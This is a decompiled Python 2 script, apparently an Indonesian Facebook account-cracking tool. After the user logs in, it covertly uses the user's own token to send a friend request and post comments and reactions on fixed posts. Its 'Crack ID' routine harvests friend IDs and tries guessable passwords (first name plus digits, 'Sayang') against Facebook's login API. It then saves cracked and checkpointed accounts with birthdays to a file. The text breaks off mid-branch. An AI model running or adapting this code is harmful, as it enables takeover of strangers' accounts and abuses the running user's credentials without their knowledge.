
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : fb_1.pyc
# Bytecode Version : 2.7
# Time : Sun Aug  9 11:47:46 2020
#---------------------------------------

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')


try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')


try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 XXXXX.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)
    

logo = '\x1b[1;31;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xf0\x9d\x99\xb7\xf0\x9d\x9a\x8a\xf0\x9d\x9a\x9f\xf0\x9d\x9a\x8e \xf0\x9d\x9a\x8a\n\x1b[37;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xf0\x9d\x99\xbd\xf0\x9d\x9a\x92\xf0\x9d\x9a\x8c\xf0\x9d\x9a\x8e \xf0\x9d\x99\xb3\xf0\x9d\x9a\x8a\xf0\x9d\x9a\xa2 \xf0\x9f\x99\x82\n\n\x1b[37;1mAuthor   : Muhammad Rizky\n\x1b[37;1mRecode   : Tegar ID\n\x1b[37;1mGithub   : https://github.com/Tegar-ID/\n\x1b[37;1mFacebook : https://www.facebook.com/tegar.sabila.908\n\x1b[37;1mDonate   : 082125068665 ( Tri )'

def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Sedang masuk\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)
    

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = 'Not Vuln'
vuln = 'Vuln'

def masuk():
    os.system('clear')
    print logo
    print '\x1b[37;1m_____________________________'
    print '\x1b[37;1m[\x1b[32;1m01\x1b[37;1m]\x1b[32;1m Login Menggunakan Email / ID Facebook'
    print '\x1b[37;1m[\x1b[32;1m02\x1b[37;1m]\x1b[32;1m Login Menggunakan Token Facebook '
    print '\x1b[37;1m[\x1b[32;1m03\x1b[37;1m]\x1b[32;1m Ambil Token'
    print '\x1b[37;1m[\x1b[32;1m00\x1b[37;1m]\x1b[32;1m Keluar'
    print '\x1b[37;1m_____________________________'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[37;1m-> \x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        login()
    elif msuk == '2' or msuk == '02':
        tokenz()
    elif msuk == '3' or msuk == '03':
        Ambil_Token()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] Isi Yg Benar !'
        pilih_masuk()


def login():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;97m[\x1b[1;96m\xf0\x9f\xa4\xa1\x1b[1;97m] LOGIN AKUN FACEBOOK ANDA \x1b[1;97m[\x1b[1;96m\xf0\x9f\xa4\xa1\x1b[1;97m]'
        id = raw_input('[\x1b[1;95m+\x1b[1;97m] ID / Email =\x1b[1;92m ')
        pwd = raw_input('\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] Password =\x1b[1;92m ')
        tik()
        
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr = 0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'credentials_type': 'password',
                    'email': id,
                    'format': 'JSON',
                    'generate_machine_id': '1',
                    'generate_session_cookies': '1',
                    'locale': 'en_US',
                    'method': 'auth.login',
                    'password': pwd,
                    'return_ssl_resources': '0',
                    'v': '1.0' }
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({
                    'sig': a })
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params = data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
                os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n[!] Tidak ada koneksi'
                keluar()
            

        if 'checkpoint' in url:
            print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m Sepertinya Akun Anda Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Password / Email Salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()



def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] \x1b[1;93mToken : \x1b[1;92m')
    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
        os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken Salah !'
        time.sleep(1.7)
        masuk()



def bot_komen():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100034051991120'
    kom = 'Hello Virgiirhsy'
    reac = 'ANGRY'
    post = '271600697318328'
    post2 = '271538587324539'
    kom2 = 'Uwow \xf0\x9f\x98\xae'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def Ambil_Token():
    os.system('clear')
    print logo
    jalan('\x1b[1;92mInstall...')
    os.system('cd ... && npm install')
    jalan('\x1b[1;96mMulai...')
    os.system('cd ... && npm start')
    raw_input('\n[ Kembali ]')
    masuk()


def menu():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Nama Akun\x1b[1;91m     =>\x1b[1;92m ' + nama
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m UID\x1b[1;91m           =>\x1b[1;92m ' + id
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Tanggal Lahir\x1b[1;91m =>\x1b[1;92m ' + a['birthday']
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack ID Indonesia'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack ID Bangladesh / Pakistan'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack ID Semua Negara ( Buat Sandi )'
    print '\x1b[1;97m[\x1b[1;92m04\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Ambil ID'
    print '\x1b[1;97m[\x1b[1;92m05\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Yahoo Clone'
    print '\x1b[1;97m[\x1b[1;92m06\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Profile Guard'
    print '\x1b[1;97m[\x1b[1;92m07\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Ikuti Saya di Facebook'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Logout'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;93m-> \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        bangla()
    elif unikers == '3' or unikers == '03':
        sandi()
    elif unikers == '4' or unikers == '04':
        dump()
    elif unikers == '5' or unikers == '05':
        menu_yahoo()
    elif unikers == '6' or unikers == '06':
        guard()
    elif unikers == '7' or unikers == '07':
        saya()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih()


def indo():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari Daftar Teman'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari ID Publik / Teman'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    pilih_indo()


def pilih_indo():
    teak = raw_input('\x1b[1;93m-> \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_indo()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
        
    elif teak == '2' or teak == '02':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print ' \x1b[1;93m         \xf0\x9f\xa4\xa1 \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xf0\x9f\xa4\xa1'
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        idt = raw_input('\x1b[1;97m{\x1b[1;93m+\x1b[1;97m} ID Publik / Teman : ')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m{\x1b[1;93m\xe2\x9c\x93\x1b[1;97m} Nama : ' + op['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] ID Publik / Teman Tidak Ada !'
            raw_input('\n[ Kembali ]')
            indo()
        except requests.exceptions.ConnectionError:
            print '[!] Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        
    elif teak == '3' or teak == '03':
        os.system('clear')
        print logo
        
        try:
            print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            idlist = raw_input('\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Nama File : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\x1b[1;97m[!] File tidak ada ! '
            raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
        except IOError:
            print '\x1b[1;97m[!] File tidak ada !'
            raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            indo()

    elif teak == '0' or teak == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_indo()
    print '\x1b[1;97m{\x1b[1;93m+\x1b[1;97m} Total ID : ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Stop CTRL+Z'
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;93m\xe2\x80\xa2\x1b[1;97m} Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    
    print '\n\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('out')
        except OSError:
            pass

        
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            pass1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                print '\x1b[1;92m(!) [Berhasil]'
                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass1
                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                oks.append(user + pass1 + birthday + subscribers)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                print '\x1b[1;93m(!) [Cekpoint]'
                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass1
                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                cek = open('out/ind1.txt', 'a')
                cek.write('UID:' + user + ' Katasandi:' + pass1 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                cek.close()
                cekpoint.append(user + pass1 + birthday + subscribers)
            else:
                pass2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                    print '\x1b[1;92m(!) [Berhasil]'
                    print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                    print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                    print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass2
                    print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                    print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                    oks.append(user + pass2 + birthday + subscribers)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                    print '\x1b[1;93m(!) [Cekpoint]'
                    print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                    print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                    print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass2
                    print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                    print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                    cek = open('out/ind1.txt', 'a')
                    cek.write('UID:' + user + ' Katasandi:' + pass2 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                    cek.close()
                    cekpoint.append(user + pass2 + birthday + subscribers)
                else:
                    pass3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                        print '\x1b[1;92m(!) [Berhasil]'
                        print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                        print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                        print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass3
                        print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                        print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                        oks.append(user + pass3 + birthday + subscribers)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                        print '\x1b[1;93m(!) [Cekpoint]'
                        print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                        print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                        print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass3
                        print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                        print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                        cek = open('out/ind1.txt', 'a')
                        cek.write('UID:' + user + ' Katasandi:' + pass3 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                        cek.close()
                        cekpoint.append(user + pass3 + birthday + subscribers)
                    else:
                        pass4 = 'Sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                            print '\x1b[1;92m(!) [Berhasil]'
                            print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                            print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                            print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass4
                            print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                            print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
